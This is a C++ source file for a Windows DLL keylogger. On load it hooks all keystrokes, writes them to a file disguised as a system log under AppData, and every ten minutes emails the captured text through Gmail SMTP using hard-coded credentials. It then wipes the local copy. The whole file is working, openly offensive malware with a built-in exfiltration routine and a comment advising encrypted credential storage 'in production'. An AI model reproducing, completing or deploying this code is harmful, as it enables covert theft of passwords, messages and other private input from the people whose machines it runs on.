// logger.cpp
#include <windows.h>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <mutex>
#include <filesystem>
#include <curl/curl.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
// Link to libcurl: e.g. curl/libcurl.lib

static HHOOK g_hook = nullptr;
static std::mutex g_fileMutex;
static const std::wstring logPath = [](){
    wchar_t* appdata = nullptr;
    size_t len = 0;
    _wdupenv_s(&appdata, &len, L"APPDATA");
    std::wstring p = appdata ? appdata : L".";
    if (appdata) free(appdata);
    std::filesystem::create_directories(p + L"\\Microsoft\\Windows\\Logs");
    return p + L"\\Microsoft\\Windows\\Logs\\syslog.dat";
}();

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto p = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        BYTE keyState[256] = {0};
        GetKeyboardState(keyState);
        WCHAR unicode[4] = {0};
        // MapVirtualKey + ToUnicode for proper shift/caps handling
        int res = ToUnicode(p->vkCode, p->scanCode, keyState, unicode, _countof(unicode), 0);
        if (res > 0) {
            std::lock_guard lock(g_fileMutex);
            std::wofstream log(logPath, std::ios::app);
            log << unicode[0];
        }
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

bool sendLogViaSMTP(const std::string& username,
                    const std::string& password,
                    const std::string& to,
                    const std::string& subject)
{
    std::lock_guard lock(g_fileMutex);
    std::ifstream file(logPath, std::ios::binary);
    if (!file) return false;

    std::vector<std::string> payloadLines;
    payloadLines.push_back("Date: " + std::string(__DATE__) + "\r\n");
    payloadLines.push_back("To: " + to + "\r\n");
    payloadLines.push_back("From: " + username + "\r\n");
    payloadLines.push_back("Subject: " + subject + "\r\n");
    payloadLines.push_back("\r\n"); // separator

    // read log contents
    std::string logContents((std::istreambuf_iterator<char>(file)),
                             std::istreambuf_iterator<char>());
    payloadLines.push_back(logContents + "\r\n.\r\n");

    struct UploadContext {
        std::vector<std::string> lines;
        size_t index = 0;
    } ctx{payloadLines};

    auto payloadSource = [](char* ptr, size_t size, size_t nmemb, void* userp) -> size_t {
        auto* c = reinterpret_cast<UploadContext*>(userp);
        if (c->index >= c->lines.size()) return 0;
        const std::string& data = c->lines[c->index++];
        size_t len = std::min(data.size(), size * nmemb);
        memcpy(ptr, data.c_str(), len);
        return len;
    };

    CURL* curl = curl_easy_init();
    if (!curl) return false;
    curl_easy_setopt(curl, CURLOPT_USERNAME, username.c_str());
    curl_easy_setopt(curl, CURLOPT_PASSWORD, password.c_str());
    curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
    curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + username + ">").c_str());

    struct curl_slist* recipients = nullptr;
    recipients = curl_slist_append(recipients, ("<" + to + ">").c_str());
    curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

    curl_easy_setopt(curl, CURLOPT_READFUNCTION, payloadSource);
    curl_easy_setopt(curl, CURLOPT_READDATA, &ctx);
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
    curl_easy_setopt(curl, CURLOPT_CAINFO, "curl-ca-bundle.crt"); // or your cert bundle

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(recipients);
    curl_easy_cleanup(curl);

    if (res == CURLE_OK) {
        // securely erase
        std::ofstream ofs(logPath, std::ios::trunc);
        return true;
    }
    return false;
}

void timerLoop(const std::string& user, const std::string& pass, const std::string& to) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(10));
        for (int attempts = 0; attempts < 3; ++attempts) {
            if (sendLogViaSMTP(user, pass, to, "Keylogger Report")) 
                break;
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
}

DWORD WINAPI HookThread(LPVOID lpParam) {
    const auto creds = *reinterpret_cast<std::pair<std::string,std::string>*>(lpParam);
    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!g_hook) return 1;

    // start timer/sender
    std::thread(timerLoop, creds.first, creds.second, creds.first).detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(g_hook);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        // credentials hard-coded here for demo; 
        // in production fetch from encrypted resource
        auto* creds = new std::pair<std::string,std::string>{
            "istiqlal1234@gmail.com", "your_app_password_here"
        };
        CreateThread(nullptr, 0, HookThread, creds, 0, nullptr);
    }
    return TRUE;
}
